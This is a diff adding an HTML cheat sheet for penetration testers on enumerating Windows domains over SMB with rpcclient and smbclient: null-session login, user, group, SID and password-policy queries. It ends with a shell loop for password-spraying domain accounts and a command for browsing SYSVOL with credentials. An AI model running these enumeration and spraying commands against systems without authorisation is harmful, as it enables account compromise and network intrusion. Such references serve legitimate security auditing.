@@ -1,0 +1,42 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SMB / rpcclient / smbclient</title>
+</head><body>$ rpcclient -U &lt;username&gt; &lt;WinIPaddr&gt;&#09;&#09;&#09;Linux: connect to share<br/>
+$ rpcclient -U "" -N &lt;IP&gt;&#09;&#09;&#09;&#09;&#09;&#09;Linux: connect via anonymous/NULL<br/>
+<br/>
+rpcclient $&gt; srvinfo&#09;&#09;&#09;&#09;&#09;&#09;&#09;Get hostname information. Refer to <a href="http://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions">here</a>.<br/>
+rpcclient $&gt; enumdomusers&#09;&#09;&#09;&#09;&#09;Get usernames and RIDs<br/>
+rpcclient $&gt; enumalsgroups domain&#09;&#09;&#09;&#09;Enumerate domain groups<br/>
+rpcclient $&gt; enumalsgroups builtin&#09;&#09;&#09;&#09;Enumerate builtin groups<br/>
+rpcclient $&gt; queryuser &lt;RID&gt;&#09;&#09;&#09;&#09;&#09;Query detailed user information based on RID<br/>
+Note here that the output shows the last logon time for the user, as well as the Password last set Time. That kind of stuff is immensely valuable for auditors and penetration testers alike.<br/>
+rpcclient $&gt; querygroup &lt;RID&gt;&#09;&#09;&#09;&#09;&#09;Query groups based on RID<br/>
+If querygroup doesn't work, try queryaliasmem<br/>
+rpcclient $&gt; queryaliasmem &lt;groupName&gt; &lt;RID&gt;&#09;Query groups, get user SIDs<br/>
+rpcclient $&gt; querygroupmem &lt;RID&gt;&#09;&#09;&#09;&#09;Query users' group membership<br/>
+<br/>
+rpcclient $&gt; getdompwinfo&#09;&#09;&#09;&#09;&#09;&#09;Query for password complexity settings<br/>
+rpcclient $&gt; getusrdompwinfo 0x44f (rid)&#09;&#09;&#09;Query users password properties<br/>
+<br/>
+Other commands<br/>
+enumalsgroups &nbsp;enumdomains &nbsp; &nbsp;enumdrivers &nbsp; &nbsp;enumkey &nbsp; &nbsp; enumprivs<br/>
+enumdata &nbsp; &nbsp; &nbsp; enumdomgroups &nbsp;enumforms &nbsp; &nbsp; &nbsp;enumports &nbsp; enumtrust<br/>
+enumdataex &nbsp; &nbsp; enumdomusers &nbsp; enumjobs &nbsp; &nbsp; &nbsp; enumprinter<br/>
+<br/>
+rpcclient $&gt; lsaenumsid&#09;&#09;&#09;&#09;&#09;&#09;Query for all SID numbers<br/>
+rpcclient $&gt; lookupsids &lt;SID&gt;&#09;&#09;&#09;&#09;&#09;Reverse query SIDS for account names<br/>
+NT_STATUS_NONE_MAPPED is returned if no account is linked to the queried SID<br/>
+rpcclient $&gt; &nbsp;lookupnames &lt;username&gt;&#09;&#09;&#09;Query username for SID<br/>
+<br/>
+Script for password spray over rpcclient<br/>
+# for u in 'cat domain-users.txt'; do \ <br/>
+&nbsp; &nbsp; echo -n "[*] user: $u" &amp;&amp; \ <br/>
+&nbsp; &nbsp; rpcclient -U "$u%&lt;PASSWORD&gt;" \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; -c "getusername;quit" &lt;IP&gt; \<br/>
+done<br/>
+<br/>
+Use smbclient and creds to gather SYSVOL information<br/>
+$ smbclient -U "&lt;username&gt;%&lt;password&gt;" \\\\domain.corp\\SYSVOL<br/>
+smb: \&gt; ls</body></html>
